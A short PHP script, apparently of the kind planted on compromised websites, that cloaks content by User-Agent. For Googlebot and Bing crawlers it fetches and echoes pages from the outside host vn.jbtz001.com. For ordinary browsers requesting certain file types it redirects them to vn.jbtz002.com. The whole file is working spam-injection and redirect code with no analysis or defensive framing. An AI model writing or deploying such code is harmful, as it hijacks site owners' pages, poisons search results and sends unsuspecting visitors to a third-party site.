<?php
function is_Spider($user)
{
    return preg_match("/Googlebot|bingbot/i", $user);
}

function is_User($user)
{
    return preg_match("/Android|iPhone|iPad|iPod|Symbian|Mac|Windows NT/i", $user);
}

function is_Ents($link)
{
    return preg_match("/\.bug|\.fdc|\.znb|\.msl|\.xml|\.htm|\.html|\.doc|\.ppt/i", $link);
}

function get_Data($url)
{
    $data = file_get_contents($url);
    return $data;
}

$request = $_SERVER['REQUEST_URI'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

$data_link = $request;
$data_user = $userAgent;
$data_host = "http://vn.jbtz001.com/indexbtc.php";
$data_redt = "http://vn.jbtz002.com/vnbtc.html";

if (is_Spider($data_user)) {
    if (is_Ents($data_link)) {
        $data = get_Data($data_host . "?ac=html&host=" . $data_link);
        echo $data;
        exit();
    } else {
        $data = get_Data("http://vn.jbtz001.com/lunlian.php");
        echo $data;
    }
}

if (is_User($data_user) && is_Ents($data_link)) {
    header("Location: " . $data_redt);
    exit();
}
?>
